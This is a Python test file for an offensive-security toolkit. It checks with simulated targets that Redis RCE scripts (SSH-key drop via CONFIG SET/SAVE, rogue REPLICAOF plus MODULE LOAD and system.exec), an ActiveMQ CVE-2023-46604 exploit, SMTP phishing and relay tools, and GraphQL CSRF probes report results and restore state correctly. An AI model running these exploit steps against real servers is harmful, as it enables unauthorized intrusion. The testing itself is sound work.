#!/usr/bin/env python3
"""Deterministic R3 specialist verdict/lifecycle regression fixtures."""
from __future__ import annotations

import argparse
import contextlib
import importlib.util
import io
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parents[2]


def load(name: str, rel: str):
    spec = importlib.util.spec_from_file_location(name, REPO / rel)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


GQL = load("gql_r3", "standalones/graphql/gql.py")
JABBER = load("jabber_r3", "standalones/jabber/jabber-user-enum.py")
OPENFIRE = load("openfire_r3", "standalones/jabber/openfire-cve-2023-32315.py")
ACTIVEMQ = load("activemq_r3", "standalones/activemq/activemq-cve-2023-46604.py")
DATA_AUDIT = load("data_audit_r3", "aranumtoolkit/tests/data_audit.py")
REDIS_SOURCE = load("redis_source_r3", "standalones/redis/module/verify_source.py")


class SmtpSemantics(unittest.TestCase):
    LIB = REPO / "standalones/smtp/_smtp_lib.sh"

    def test_multiline_replies_are_associated_with_rcpt(self):
        transcript = "220 ready\n250-a\n250-b\n250 hello\n250 mail\n550 rcpt\n221 bye"
        run = subprocess.run(
            ["bash", "-c", '. "$1"; smtp_command_code "$2" 3', "_", str(self.LIB), transcript],
            text=True, capture_output=True,
        )
        self.assertEqual(run.returncode, 0, run.stderr)
        self.assertEqual(run.stdout.strip(), "550")

    def _smtp_path(self, root: Path) -> dict:
        nc = root / "nc"
        nc.write_text("""#!/usr/bin/env python3
import os, sys
print('220 mock ready', flush=True)
in_data = False
for raw in sys.stdin:
    line = raw.rstrip('\\r\\n')
    if in_data:
        if line == '.':
            print(os.environ.get('SMTP_FINAL', '250 queued'), flush=True); in_data = False
        continue
    cmd = line.split(' ', 1)[0].upper()
    if cmd in ('EHLO','HELO'):
        print('250-mock', flush=True); print('250 PIPELINING', flush=True)
    elif cmd == 'MAIL': print('250 sender ok', flush=True)
    elif cmd == 'RCPT': print(os.environ.get('SMTP_RCPT', '250 recipient ok'), flush=True)
    elif cmd == 'DATA':
        reply = os.environ.get('SMTP_DATA', '354 go ahead'); print(reply, flush=True)
        in_data = reply.startswith('354')
    elif cmd == 'VRFY': print('252 cannot verify', flush=True)
    elif cmd == 'QUIT': print('221 bye', flush=True); break
""")
        nc.chmod(nc.stat().st_mode | stat.S_IXUSR)
        return {**os.environ, "PATH": f"{root}:{os.environ['PATH']}"}

    def _phish(self, env):
        return subprocess.run([
            "bash", str(REPO / "standalones/smtp/smtp-phish-send.sh"),
            "--target", "mock:25", "--from", "a@external.example", "--to", "b@external.example",
            "--subject", "fixture", "--body", "benign", "--send",
        ], text=True, capture_output=True, env=env, timeout=10)

    def test_sender_rejects_rcpt_and_accepts_completed_data(self):
        with tempfile.TemporaryDirectory() as td:
            env = self._smtp_path(Path(td)); env["SMTP_RCPT"] = "550 rejected"
            rejected = self._phish(env)
            self.assertEqual(rejected.returncode, 73, rejected.stdout + rejected.stderr)
            env["SMTP_RCPT"] = "250 recipient ok"
            accepted = self._phish(env)
            self.assertEqual(accepted.returncode, 0, accepted.stdout + accepted.stderr)
            self.assertIn("Message accepted", accepted.stdout)

    def test_spf_hardfail_without_dmarc_is_stable(self):
        with tempfile.TemporaryDirectory() as td:
            dig = Path(td) / "dig"
            dig.write_text("""#!/bin/sh
case "$*" in
  *'_dmarc.'*) exit 0 ;;
  *' TXT '*) echo '"v=spf1 -all"' ;;
esac
""")
            dig.chmod(0o755)
            env = {**os.environ, "PATH": f"{td}:{os.environ['PATH']}"}
            run = subprocess.run(["bash", str(REPO / "standalones/smtp/spf-dmarc-check.sh"), "example.test"],
                                 text=True, capture_output=True, env=env)
            self.assertEqual(run.returncode, 0, run.stdout + run.stderr)
            self.assertIn("HardFail", run.stdout)
            self.assertNotIn("unbound variable", run.stderr)

    def test_dns_command_failure_is_indeterminate_nonzero(self):
        with tempfile.TemporaryDirectory() as td:
            dig = Path(td) / "dig"
            dig.write_text("#!/bin/sh\necho 'resolver unavailable' >&2\nexit 9\n")
            dig.chmod(0o755)
            env = {**os.environ, "PATH": f"{td}:{os.environ['PATH']}"}
            run = subprocess.run(["bash", str(REPO / "standalones/smtp/spf-dmarc-check.sh"), "example.test"],
                                 text=True, capture_output=True, env=env)
            self.assertEqual(run.returncode, 2, run.stdout + run.stderr)
            self.assertIn("INDETERMINATE", run.stdout)
            self.assertNotIn("DOMAIN IS WIDE OPEN", run.stdout)

    def test_relay_matrix_does_not_call_external_to_local_a_relay(self):
        with tempfile.TemporaryDirectory() as td:
            env = self._smtp_path(Path(td)); env["SMTP_RCPT"] = "250 recipient ok"
            run = subprocess.run([
                "bash", str(REPO / "standalones/smtp/smtp-relay-test.sh"),
                "--target", "mock:25", "--internal-domain", "corp.test",
            ], text=True, capture_output=True, env=env, timeout=15)
            self.assertEqual(run.returncode, 0, run.stderr)
            line18 = next(line for line in run.stdout.splitlines() if line.startswith("18 "))
            self.assertIn("expected local delivery", line18)
            self.assertNotIn("RELAY OPEN", line18)
            line16 = next(line for line in run.stdout.splitlines() if line.startswith("16 "))
            self.assertIn("not relay evidence", line16)
            self.assertNotIn("RELAY OPEN", line16)


class RedisSemantics(unittest.TestCase):
    LIB = REPO / "standalones/redis/_redis_lib.sh"

    def _module_fixture(self, scenario: str):
        """Run the complete module lifecycle against a stateful fake redis-cli."""
        temp = tempfile.TemporaryDirectory()
        root = Path(temp.name)
        calls = root / "calls"
        module = root / "fixture.so"
        module.write_bytes(b"fixture")
        cli = root / "redis-cli"
        cli.write_text(r'''#!/usr/bin/python3
import os, sys
a = sys.argv[1:]
for command in ("PING", "INFO", "CONFIG", "ACL", "REPLICAOF", "MODULE", "system.exec"):
    if command in a:
        a = a[a.index(command):]
        break
with open(os.environ["REDIS_CALLS"], "a") as fh:
    fh.write(" ".join(a) + "\n")
scenario = os.environ["REDIS_SCENARIO"]
if a[:1] == ["PING"]:
    print("PONG")
elif a[:2] == ["INFO", "server"]:
    print("redis_version:7.2.0")
elif a[:2] == ["INFO", "replication"]:
    print("role:master")
elif a[:2] == ["CONFIG", "GET"]:
    values = {"enable-module-command": "yes", "dir": "/var/lib/redis",
              "dbfilename": "dump.rdb", "appendonly": "yes",
              "masterauth": "", "masteruser": ""}
    print(a[2]); print(values[a[2]])
elif a[:2] == ["CONFIG", "SET"]:
    if scenario == "stage_fail" and a[2] == "dbfilename" and a[3] != "dump.rdb":
        print("OK-but-not-applied")
    elif scenario == "restore_fail_main_fail" and a[2:4] == ["dir", "/var/lib/redis"]:
        print("OK-but-not-restored")
    else:
        print("OK")
elif a[:2] == ["ACL", "WHOAMI"]:
    print("default")
elif a[:2] == ["ACL", "DRYRUN"]:
    print("OK")
elif a[:1] == ["REPLICAOF"]:
    print("OK")
elif a[:2] == ["MODULE", "LOAD"]:
    print("OK")
elif a[:2] == ["MODULE", "UNLOAD"]:
    print("OK-but-still-loaded" if scenario == "unload_fail" else "OK")
elif a[:1] == ["system.exec"]:
    if scenario == "restore_fail_main_fail":
        print("ERR command failed"); sys.exit(9)
    print("fixture-output")
else:
    print("ERR unexpected fixture command"); sys.exit(12)
''')
        cli.chmod(0o755)
        fake_python = root / "python3"
        fake_python.write_text("#!/bin/sh\necho 'Sent 7 bytes payload'\nwhile :; do sleep 1; done\n")
        fake_python.chmod(0o755)
        env = {**os.environ, "PATH": f"{root}:{os.environ['PATH']}",
               "REDIS_CALLS": str(calls), "REDIS_SCENARIO": scenario}
        run = subprocess.run([
            "bash", str(REPO / "standalones/redis/redis-rce-module.sh"),
            "--target", "fixture:6379", "--module", str(module),
            "--local-ip", "127.0.0.1", "--remote-name", "fixture.so", "--exploit",
        ], env=env, text=True, capture_output=True, timeout=15)
        return temp, calls.read_text(), run

    def _ssh_fixture(self, scenario: str):
        temp = tempfile.TemporaryDirectory()
        root = Path(temp.name); calls = root / "calls"; state = root / "state.json"
        state.write_text(json.dumps({"strlen": 0, "config": {
            "dir": "/var/lib/redis", "dbfilename": "dump.rdb", "appendonly": "yes",
            "masterauth": "", "masteruser": ""}}))
        cli = root / "redis-cli"
        cli.write_text(r'''#!/usr/bin/python3
import json, os, sys
p = os.environ["REDIS_STATE"]; s = json.load(open(p)); a = sys.argv[1:]
for command in ("PING", "INFO", "CONFIG", "SET", "STRLEN", "SAVE"):
    if command in a:
        a = a[a.index(command):]
        break
with open(os.environ["REDIS_CALLS"], "a") as fh: fh.write(a[0] + " " + " ".join(a[1:3]) + "\n")
scenario = os.environ["REDIS_SCENARIO"]
if a[:1] == ["PING"]: print("PONG")
elif a[:2] == ["INFO", "server"]: print("redis_version:7.2.0")
elif a[:2] == ["INFO", "replication"]: print("role:master")
elif a[:2] == ["CONFIG", "GET"]: print(a[2]); print(s["config"][a[2]])
elif a[:2] == ["CONFIG", "SET"]:
    if scenario == "config_false_ok" and a[2:4] == ["dbfilename", "authorized_keys"]:
        print("OK-but-not-applied")
    elif scenario == "restore_fail_main_fail" and a[2:4] == ["dir", "/var/lib/redis"]:
        print("OK-but-not-restored")
    else:
        s["config"][a[2]] = a[3]; json.dump(s, open(p, "w")); print("  OK  ")
elif a[:1] == ["SET"]:
    if scenario == "set_false_ok": print("OK-but-not-applied")
    elif scenario == "set_rc_fail": print("OK"); sys.exit(9)
    else:
        s["strlen"] = len(a[2].encode()); json.dump(s, open(p, "w")); print("OK")
elif a[:1] == ["STRLEN"]: print(s["strlen"])
elif a[:1] == ["SAVE"]:
    print("OK-but-not-saved" if scenario in ("save_false_ok", "restore_fail_main_fail") else "OK")
else: print("ERR unexpected"); sys.exit(12)
'''); cli.chmod(0o755)
        env = {**os.environ, "PATH": f"{root}:{os.environ['PATH']}", "REDIS_STATE": str(state),
               "REDIS_CALLS": str(calls), "REDIS_SCENARIO": scenario}
        run = subprocess.run([
            "bash", str(REPO / "standalones/redis/redis-rce-ssh.sh"),
            "--target", "fixture:6379", "--key-inline", "ssh-ed25519 AAAAFIXTURE",
            "--write", "--no-verify", "--dirs", "/root/.ssh",
        ], env=env, text=True, capture_output=True, timeout=10)
        return temp, calls.read_text(), run

    def test_named_acl_and_legacy_auth_argv(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td); log = root / "argv"
            cli = root / "redis-cli"
            cli.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >> "$REDIS_ARGV_LOG"\necho PONG\n')
            cli.chmod(0o755)
            env = {**os.environ, "PATH": f"{root}:{os.environ['PATH']}", "REDIS_ARGV_LOG": str(log)}
            cmd = '. "$1"; HOST=h; PORT=6379; USERNAME=assessor; PASS=secret; rcmd PING >/dev/null; USERNAME=""; rcmd PING >/dev/null'
            run = subprocess.run(["bash", "-c", cmd, "_", str(self.LIB)], env=env, text=True, capture_output=True)
            self.assertEqual(run.returncode, 0, run.stderr)
            lines = log.read_text().splitlines()
            self.assertIn("--user assessor --pass secret", lines[0])
            self.assertIn("-a secret", lines[1])

    def test_module_policy_denied_is_not_capable(self):
        with tempfile.TemporaryDirectory() as td:
            cli = Path(td) / "redis-cli"
            cli.write_text("""#!/bin/sh
case "$*" in
  *'CONFIG GET enable-module-command'*) printf 'enable-module-command\\nno\\n' ;;
  *) echo OK ;;
esac
"""); cli.chmod(0o755)
            env = {**os.environ, "PATH": f"{td}:{os.environ['PATH']}"}
            cmd = '. "$1"; HOST=h; PORT=6379; PASS=""; USERNAME=""; REDIS_VERSION=7.2.0; probe_module_load_capability; echo "$MODULE_LOAD_STATE|$MODULE_LOAD_REASON"'
            run = subprocess.run(["bash", "-c", cmd, "_", str(self.LIB)], env=env, text=True, capture_output=True)
            self.assertEqual(run.returncode, 0, run.stderr)
            self.assertIn("denied|enable-module-command=no", run.stdout)

    def test_module_policy_local_is_denied_for_tcp_even_when_acl_allows(self):
        with tempfile.TemporaryDirectory() as td:
            cli = Path(td) / "redis-cli"
            cli.write_text("""#!/bin/sh
case "$*" in
  *'CONFIG GET enable-module-command'*) printf 'enable-module-command\nlocal\n' ;;
  *'ACL WHOAMI'*) echo assessor ;;
  *'ACL DRYRUN'*) echo OK ;;
  *) echo OK ;;
esac
"""); cli.chmod(0o755)
            env = {**os.environ, "PATH": f"{td}:{os.environ['PATH']}"}
            cmd = '. "$1"; HOST=remote; PORT=6379; PASS=""; USERNAME=""; REDIS_VERSION=7.2.0; probe_module_load_capability; echo "$MODULE_LOAD_STATE|$MODULE_LOAD_REASON"'
            run = subprocess.run(["bash", "-c", cmd, "_", str(self.LIB)], env=env, text=True, capture_output=True)
            self.assertEqual(run.returncode, 0, run.stderr)
            self.assertIn("denied|enable-module-command=local", run.stdout)

    def test_empty_config_values_and_redis_cli_status_are_preserved(self):
        with tempfile.TemporaryDirectory() as td:
            cli = Path(td) / "redis-cli"
            cli.write_text("""#!/bin/sh
case "$*" in
  *'CONFIG GET masterauth') printf 'masterauth\n' ;;
  *'CONFIG GET masteruser') printf 'masteruser\n' ;;
  *FAILSTATUS*) exit 9 ;;
  *) echo OK ;;
esac
"""); cli.chmod(0o755)
            env = {**os.environ, "PATH": f"{td}:{os.environ['PATH']}"}
            cmd = ('. "$1"; HOST=h; PORT=6379; PASS=""; USERNAME=""; '
                   'a=$(_config_get_value masterauth) || exit 20; u=$(_config_get_value masteruser) || exit 21; '
                   '[ -z "$a" ] && [ -z "$u" ] || exit 22; rcmd FAILSTATUS >/dev/null; [ "$?" = 9 ]')
            run = subprocess.run(["bash", "-c", cmd, "_", str(self.LIB)], env=env,
                                 text=True, capture_output=True)
            self.assertEqual(run.returncode, 0, run.stdout + run.stderr)

    def test_missing_compiler_fails_before_target_probe(self):
        with tempfile.TemporaryDirectory() as td:
            missing = Path(td) / "absent.so"
            env = {**os.environ, "CC": "definitely-no-r3-compiler"}
            run = subprocess.run([
                "bash", str(REPO / "standalones/redis/redis-rce-module.sh"),
                "--target", "127.0.0.1:1", "--module", str(missing), "--exploit",
            ], text=True, capture_output=True, env=env)
            self.assertEqual(run.returncode, 1)
            self.assertIn("missing build prerequisite", run.stdout + run.stderr)
            self.assertNotIn("redis unreachable", run.stdout + run.stderr)

    def test_replica_state_and_auth_are_restored_exactly(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td); state_path = root / "state.json"
            original = {"role": "slave", "host": "upstream.test", "port": "6380",
                        "config": {"dir": "/var/lib/redis", "dbfilename": "dump.rdb",
                                   "appendonly": "yes", "masterauth": "old-secret", "masteruser": "repl"}}
            state_path.write_text(json.dumps(original))
            cli = root / "redis-cli"
            cli.write_text("""#!/usr/bin/env python3
import json, os, sys
p=os.environ['REDIS_STATE']; s=json.load(open(p)); a=sys.argv[1:]
for command in ('CONFIG','INFO','REPLICAOF'):
    if command in a: i=a.index(command); a=a[i:]; break
if a[:2] == ['INFO','replication']:
    print('role:'+s['role'])
    if s['role'] in ('slave','replica'):
        print('master_host:'+s['host']); print('master_port:'+s['port'])
elif a[:2] == ['CONFIG','GET']:
    k=a[2]; print(k); print(s['config'].get(k,''))
elif a[:2] == ['CONFIG','SET']:
    s['config'][a[2]]=a[3]; json.dump(s,open(p,'w')); print('OK')
elif a and a[0] == 'REPLICAOF':
    if a[1:3] == ['NO','ONE']: s.update(role='master',host='',port='')
    else: s.update(role='slave',host=a[1],port=a[2])
    json.dump(s,open(p,'w')); print('OK')
else: print('OK')
"""); cli.chmod(0o755)
            env = {**os.environ, "PATH": f"{root}:{os.environ['PATH']}", "REDIS_STATE": str(state_path)}
            command = ('. "$1"; HOST=h; PORT=6379; PASS=""; USERNAME=""; '
                       'save_config || exit 20; rcmd CONFIG SET masterauth changed >/dev/null; '
                       'rcmd REPLICAOF rogue 46379 >/dev/null; restore_config || exit 21; '
                       'restore_replication_state || exit 22')
            run = subprocess.run(["bash", "-c", command, "_", str(self.LIB)], env=env,
                                 text=True, capture_output=True)
            self.assertEqual(run.returncode, 0, run.stdout + run.stderr)
            self.assertEqual(json.loads(state_path.read_text()), original)

    def test_ssh_helper_fails_before_mutation_when_snapshot_fails(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td); calls = root / "calls"; cli = root / "redis-cli"
            cli.write_text("""#!/bin/sh
printf '%s\n' "$*" >> "$REDIS_CALLS"
case "$*" in
  *PING) echo PONG ;;
  *'INFO server'*) echo redis_version:7.2.0 ;;
  *'CONFIG GET dir'*) echo 'ERR CONFIG denied' ;;
  *) echo OK ;;
esac
"""); cli.chmod(0o755)
            env = {**os.environ, "PATH": f"{root}:{os.environ['PATH']}", "REDIS_CALLS": str(calls)}
            run = subprocess.run([
                "bash", str(REPO / "standalones/redis/redis-rce-ssh.sh"), "--target", "fixture:6379",
                "--key-inline", "ssh-ed25519 AAAAFIXTURE", "--write", "--no-verify",
            ], env=env, text=True, capture_output=True)
            self.assertEqual(run.returncode, 10, run.stdout + run.stderr)
            self.assertNotIn(" SET sshpwn ", f" {calls.read_text()} ")

    def test_ssh_helper_surfaces_restore_verification_failure(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td); state = root / "state"; state.write_text("mutating")
            cli = root / "redis-cli"
            cli.write_text("""#!/bin/sh
case "$*" in
  *PING) echo PONG ;;
  *'INFO server'*) echo redis_version:7.2.0 ;;
  *'INFO replication'*) echo role:master ;;
  *'CONFIG GET dir'*) printf 'dir\n/var/lib/redis\n' ;;
  *'CONFIG GET dbfilename'*) printf 'dbfilename\ndump.rdb\n' ;;
  *'CONFIG GET appendonly'*) printf 'appendonly\nyes\n' ;;
  *'CONFIG GET masterauth'*) printf 'masterauth\n' ;;
  *'CONFIG GET masteruser'*) printf 'masteruser\n' ;;
  *'CONFIG SET dir /var/lib/redis'*) echo 'ERR restore denied' ;;
  *'CONFIG SET'*) echo OK ;;
  *'SET sshpwn'*) echo OK ;;
  *'STRLEN sshpwn'*) echo 29 ;;
  *SAVE) echo OK ;;
  *) echo OK ;;
esac
"""); cli.chmod(0o755)
            env = {**os.environ, "PATH": f"{root}:{os.environ['PATH']}"}
            run = subprocess.run([
                "bash", str(REPO / "standalones/redis/redis-rce-ssh.sh"), "--target", "fixture:6379",
                "--key-inline", "ssh-ed25519 AAAAFIXTURE", "--write", "--no-verify", "--dirs", "/root/.ssh",
            ], env=env, text=True, capture_output=True)
            self.assertEqual(run.returncode, 77, run.stdout + run.stderr)
            self.assertIn("restoration verification failed", run.stdout + run.stderr)

    def test_ssh_mutations_require_rc_zero_and_exact_trimmed_ok(self):
        cases = [
            ("set_false_ok", 5, "SET staging failed"),
            ("set_rc_fail", 5, "SET staging failed"),
            ("config_false_ok", 5, "CONFIG SET dbfilename failed"),
            ("save_false_ok", 4, "No writable .ssh dir found"),
        ]
        for scenario, expected, marker in cases:
            with self.subTest(scenario=scenario):
                temp, _, run = self._ssh_fixture(scenario)
                try:
                    self.assertEqual(run.returncode, expected, run.stdout + run.stderr)
                    self.assertIn(marker, run.stdout + run.stderr)
                    self.assertNotIn("Drop succeeded", run.stdout + run.stderr)
                finally:
                    temp.cleanup()

    def test_ssh_restore_failure_dominates_failed_save_path(self):
        temp, calls, run = self._ssh_fixture("restore_fail_main_fail")
        try:
            self.assertEqual(run.returncode, 77, run.stdout + run.stderr)
            self.assertIn("SAVE failed", run.stdout + run.stderr)
            self.assertIn("Redis restoration verification failed", run.stdout + run.stderr)
            self.assertGreaterEqual(calls.count("CONFIG SET dir"), 2)
        finally:
            temp.cleanup()

    def test_module_config_staging_rejects_non_ok_before_replication(self):
        temp, calls, run = self._module_fixture("stage_fail")
        try:
            self.assertEqual(run.returncode, 8, run.stdout + run.stderr)
            self.assertIn("CONFIG SET dbfilename staging failed", run.stdout + run.stderr)
            self.assertNotIn("REPLICAOF 127.0.0.1 46379", calls)
            self.assertNotIn("MODULE LOAD /tmp/fixture.so", calls)
        finally:
            temp.cleanup()

    def test_module_restore_failure_dominates_main_path_failure(self):
        temp, calls, run = self._module_fixture("restore_fail_main_fail")
        try:
            self.assertEqual(run.returncode, 77, run.stdout + run.stderr)
            self.assertIn("Redis restoration verification failed", run.stdout + run.stderr)
            self.assertIn("system.exec", calls)
            self.assertIn("CONFIG SET dir /var/lib/redis", calls)
        finally:
            temp.cleanup()

    def test_module_unload_non_ok_is_cleanup_failure(self):
        temp, calls, run = self._module_fixture("unload_fail")
        try:
            self.assertEqual(run.returncode, 77, run.stdout + run.stderr)
            self.assertIn("MODULE UNLOAD cleanup was not acknowledged", run.stdout + run.stderr)
            self.assertIn("MODULE UNLOAD system", calls)
        finally:
            temp.cleanup()


class ActiveMqSemantics(unittest.TestCase):
    LIB = REPO / "standalones/activemq/_activemq_lib.sh"

    def test_version_boundaries_and_unknown(self):
        cmd = '. "$1"; for v in 5.18.2 5.18.3 5.17.5 5.17.6 unknown; do printf "%s:%s\\n" "$v" "$(classify_version "$v")"; done'
        run = subprocess.run(["bash", "-c", cmd, "_", str(self.LIB)], text=True, capture_output=True)
        self.assertEqual(run.returncode, 0, run.stderr)
        self.assertEqual(run.stdout.splitlines(), ["5.18.2:VULN_46604", "5.18.3:PATCHED",
                                                   "5.17.5:VULN_46604", "5.17.6:PATCHED", "unknown:UNKNOWN"])

    def test_openwire_version_requires_explicit_version_evidence(self):
        cmd = '. "$1"; printf "%s" "$2" | extract_openwire_version'
        run = subprocess.run(["bash", "-c", cmd, "_", str(self.LIB), "ActiveMQ MagicID"],
                             text=True, capture_output=True)
        self.assertEqual(run.stdout, "")
        run = subprocess.run(["bash", "-c", cmd, "_", str(self.LIB), "ActiveMQ ProviderVersion 5.18.2"],
                             text=True, capture_output=True)
        self.assertEqual(run.stdout.strip(), "5.18.2")

    def test_callback_ready_before_payload_connect(self):
        events = []
        class Server:
            def shutdown(self): events.append("shutdown")
            def server_close(self): pass
        class Sock:
            def sendall(self, _): events.append("send")
            def settimeout(self, _): pass
            def recv(self, _): raise ACTIVEMQ.socket.timeout()
            def close(self): pass
        argv = ["tool", "--target", "broker:61616", "--cmd", "true", "--local-ip", "127.0.0.1",
                "--callback", "127.0.0.1:9999", "--timeout", "0", "--exploit"]
        with mock.patch.object(sys, "argv", argv), \
             mock.patch.object(ACTIVEMQ, "serve_xml", side_effect=lambda *a: (None, events.append("xml") or Server())), \
             mock.patch.object(ACTIVEMQ, "serve_callback", side_effect=lambda *a: events.append("callback") or Server()), \
             mock.patch.object(ACTIVEMQ.socket, "create_connection", side_effect=lambda *a, **k: events.append("connect") or Sock()):
            self.assertEqual(ACTIVEMQ.main(), 0)
        self.assertLess(events.index("callback"), events.index("connect"))

    def test_structural_queue_parser_preserves_complex_names(self):
        with tempfile.TemporaryDirectory() as td:
            src = Path(td) / "j.json"
            src.write_text(json.dumps({"value": [
                'org.apache.activemq:type=Broker,brokerName=west,destinationType=Queue,destinationName="orders, priority"',
                'org.apache.activemq:type=Broker,brokerName=east,destinationType=Queue,destinationName=simple',
            ]}))
            run = subprocess.run([sys.executable, str(REPO / "standalones/activemq/jolokia_inventory.py"), "Queue", str(src)],
                                 text=True, capture_output=True)
            self.assertEqual(run.returncode, 0, run.stderr)
            self.assertIn("orders, priority", run.stdout)
            self.assertIn("west\t", run.stdout)
            self.assertIn("%22orders%2C%20priority%22", run.stdout)


class GraphQlSemantics(unittest.TestCase):
    @staticmethod
    def _csrf_args(**updates):
        values = dict(url="http://fixture/graphql", mutation="mutation { toggle { ok } }",
                      cookie="session=fixture", expect_field="toggle",
                      origin="https://attacker.invalid", token="", bearer="",
                      job_token="", header=None)
        values.update(updates)
        return argparse.Namespace(**values)

    @staticmethod
    def _raw_args(**updates):
        values = dict(url="http://fixture/graphql", query="{ fixture }", query_file=None,
                      variables=None, batch=2, raw_response=True, token="", bearer="",
                      cookie="", job_token="", header=None)
        values.update(updates)
        return argparse.Namespace(**values)

    def test_raw_mode_keeps_failure_status_and_partial_errors(self):
        args = argparse.Namespace(raw_response=True)
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(GQL.print_response(0, {"_error": "connection failed"}, args), 1)
            self.assertEqual(GQL.print_response(200, {"data": {"enabled": False}, "errors": [{"message": "partial"}]}, args), 1)
            self.assertEqual(GQL.print_response(200, {"data": {"enabled": False}}, args), 0)

    def test_malformed_graphql_error_member_is_nonzero_without_traceback(self):
        args = argparse.Namespace(raw_response=False)
        with contextlib.redirect_stdout(io.StringIO()) as output:
            self.assertEqual(GQL.print_response(200, {"errors": ["fixture-error"]}, args), 1)
        self.assertIn("fixture-error", output.getvalue())

    def test_batched_raw_http_and_member_errors_are_nonzero(self):
        cases = [
            (503, [{"data": {"fixture": True}}]),
            (200, [{"data": {"fixture": True}}, {"errors": [{"message": "denied"}]}]),
            (200, [{"data": {"fixture": True}}, {"_raw": "gateway noise"}]),
            (200, []),
        ]
        for status, body in cases:
            with self.subTest(status=status, body=body), \
                 mock.patch.object(GQL, "http_post", return_value=(status, {}, body)), \
                 contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(GQL.cmd_raw(self._raw_args()), 1)
        with mock.patch.object(GQL, "http_post", return_value=(
                200, {}, [{"data": {"fixture": False}}, {"data": {"fixture": 0}}])), \
             contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(GQL.cmd_raw(self._raw_args()), 0)

    def test_alias_document_uses_selected_operation(self):
        base = "query GqlPy($id: ID!) {\n project(id: $id) { id name }\n}\n"
        doc = GQL._alias_document(base, 2)
        self.assertEqual(doc.count("project(id: $id)"), 2)
        self.assertNotIn("a0: __typename", doc)

    def test_false_zero_empty_and_null_fields_are_structurally_present(self):
        for value in (False, 0, [], "", None):
            with self.subTest(value=value):
                shape = GQL._operation_response_shape({"data": {"enabled": value}}, "enabled")
                self.assertTrue(shape["data_member"])
                self.assertTrue(shape["operation_present"])
                self.assertEqual(shape["operation_non_null"], value is not None)
        self.assertEqual(
            GQL._operation_response_shape({"data": {"enabled": False}}, "enabled")["digest"],
            GQL._operation_response_shape({"data": {"enabled": True}}, "enabled")["digest"],
        )
        self.assertEqual(
            GQL._operation_response_shape({"data": {"count": 0}}, "count")["digest"],
            GQL._operation_response_shape({"data": {"count": 42}}, "count")["digest"],
        )

    def test_read_only_get_is_informational(self):
        args = argparse.Namespace(url="http://fixture/graphql", mutation=None, cookie="",
                                  expect_field=None, origin="https://attacker.invalid", token="",
                                  bearer="", job_token="", header=None)
        with mock.patch.object(GQL, "http_get", return_value=(200, {}, {"data": {"__typename": "Query"}})), \
             contextlib.redirect_stdout(io.StringIO()) as output:
            self.assertEqual(GQL.cmd_csrf_probe(args), 0)
        self.assertIn("informational", output.getvalue())
        self.assertNotIn("CRITICAL", output.getvalue())

    def test_explicit_auth_and_custom_csrf_tokens_cannot_claim_cookie_csrf(self):
        cases = [
            {"token": "pat-fixture"},
            {"bearer": "bearer-fixture"},
            {"job_token": "job-fixture"},
            {"header": ["X-CSRF-Token: csrf-fixture"]},
            {"header": ["authorization: Bearer custom-fixture"]},
            {"header": ["private-token: custom-fixture"]},
            {"header": ["job-token: custom-fixture"]},
            {"header": ["x-CsRf-CuStOm: custom-fixture"]},
        ]
        for updates in cases:
            with self.subTest(updates=updates), \
                 mock.patch.object(GQL, "http_get") as request, \
                 contextlib.redirect_stdout(io.StringIO()) as output:
                self.assertEqual(GQL.cmd_csrf_probe(self._csrf_args(**updates)), 2)
                request.assert_not_called()
                self.assertNotIn("CRITICAL", output.getvalue())

    def test_uncertain_mutation_responses_are_nonzero(self):
        cases = [
            (0, {"_error": "connection failed"}),
            (500, {"_raw": "upstream error"}),
            (200, {"errors": [{"message": "resolver failed"}]}),
            (200, {"data": {"toggle": True}, "errors": [{"message": "partial"}]}),
            (200, {"data": {"different": True}}),
            (200, {"data": {"toggle": None}}),
            (200, [{"data": {"toggle": True}}]),
        ]
        for status, body in cases:
            with self.subTest(status=status, body=body), \
                 mock.patch.object(GQL, "http_get", return_value=(status, {}, body)), \
                 contextlib.redirect_stdout(io.StringIO()) as output:
                self.assertEqual(GQL.cmd_csrf_probe(self._csrf_args()), 1)
                self.assertIn("indeterminate", output.getvalue().lower())

    def test_read_only_indeterminate_http_and_graphql_outcomes_are_nonzero(self):
        args = self._csrf_args(mutation=None, cookie="", expect_field=None)
        cases = [
            (0, {"_error": "connection failed"}),
            (500, {"_raw": "upstream failed"}),
            (200, {"errors": [{"message": "resolver failed"}]}),
            (200, {"data": {"__typename": "Query"}, "errors": [{"message": "partial"}]}),
        ]
        for status, body in cases:
            with self.subTest(status=status, body=body), \
                 mock.patch.object(GQL, "http_get", return_value=(status, {}, body)), \
                 contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(GQL.cmd_csrf_probe(args), 1)


class DataGovernanceSemantics(unittest.TestCase):
    def test_free_form_derivation_is_rejected(self):
        with tempfile.TemporaryDirectory() as td:
            source = Path(td) / "source.json"; source.write_text("{}")
            with self.assertRaisesRegex(ValueError, "structured object"):
                DATA_AUDIT._verify_derivation({"derivation": "trust me"}, [source])

    def test_source_manifest_checks_every_discovered_input(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td); source = root / "input.c"; source.write_text("trusted")
            manifest = root / "SOURCE.json"
            manifest.write_text(json.dumps({"input": {"path": "input.c", "source": "fixture", "sha256": "0" * 64}}))
            entry = {"derivation": {"type": "source-manifest", "input_sections": ["input"]}}
            with self.assertRaisesRegex(ValueError, "checksum mismatch"):
                DATA_AUDIT._verify_derivation(entry, [manifest])

    def test_default_redis_build_cannot_fetch_missing_vendored_input(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td) / "module"
            shutil.copytree(REPO / "standalones/redis/module", root)
            (root / "redismodule.h").unlink()
            marker = Path(td) / "network-called"
            fake_bin = Path(td) / "bin"; fake_bin.mkdir()
            for name in ("curl", "wget"):
                tool = fake_bin / name
                tool.write_text(f"#!/bin/sh\ntouch '{marker}'\nexit 99\n")
                tool.chmod(0o755)
